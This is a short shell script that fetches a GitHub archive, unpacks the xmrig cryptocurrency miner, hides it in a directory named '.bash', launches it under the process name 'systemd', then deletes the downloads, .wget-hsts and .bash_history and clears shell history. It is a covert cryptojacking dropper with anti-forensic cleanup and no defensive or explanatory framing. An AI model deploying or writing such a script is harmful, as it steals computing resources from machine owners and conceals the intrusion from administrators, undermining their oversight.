#echo "Enter Id:"
#read Id
wget https://github.com/deusveritatis/configs/archive/master.zip
unzip master.zip
cd configs-master
tar -xvzf ./bash.tar.gz
mv ./xmrig-3.1.0 ./.bash
#sed -i 's/iiserb/'"$Id"'/g' config.json
#mv ./config.json ./.bash/config.json
cd .bash/
#mv ./xmrig ./systemd
./systemd
cd ../..
rm -r master.zip
rm ./nv3v2
rm -r configs-master
rm .wget-hsts
rm .bash_history
history -c

exit

